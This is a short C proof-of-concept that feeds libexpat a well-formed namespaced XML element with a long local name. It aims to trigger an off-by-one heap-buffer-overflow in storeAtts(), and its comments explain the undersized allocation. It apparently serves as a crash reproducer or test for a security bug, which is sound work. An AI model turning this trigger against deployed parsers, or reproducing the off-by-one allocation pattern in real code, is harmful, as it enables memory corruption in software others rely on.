/* Proof-of-concept for a delocalized heap-buffer-overflow in libexpat's
 * namespace-qualified element-name expansion (storeAtts()).
 *
 * Drives only the public API with in-contract input:
 *   - XML_ParserCreateNS() to enable namespace processing, and
 *   - XML_Parse() on a well-formed namespaced XML document.
 *
 * The element's local name is long enough that storeAtts() must (re)grow the
 * per-binding buffer that holds the expanded name.  On the shipped tree the
 * grow path reserves exactly `totalLen` bytes (no EXPAND_SPARE slack), while
 * storeAtts() unconditionally writes a NUL terminator at index `totalLen`,
 * one element past the allocation -> AddressSanitizer heap-buffer-overflow.
 */
#include <string.h>
#include "expat.h"

int
main(void) {
  XML_Parser parser = XML_ParserCreateNS(NULL, '\n');
  if (parser == NULL)
    return 2;

  /* Well-formed document: element "x:<long local name>" in namespace "u". */
  static const char doc[]
      = "<x:abcdefghijklmnopqrstuvwxyz0123456789 xmlns:x='u'/>";

  XML_Parse(parser, doc, (int)(sizeof(doc) - 1), /*isFinal=*/1);

  XML_ParserFree(parser);
  return 0;
}
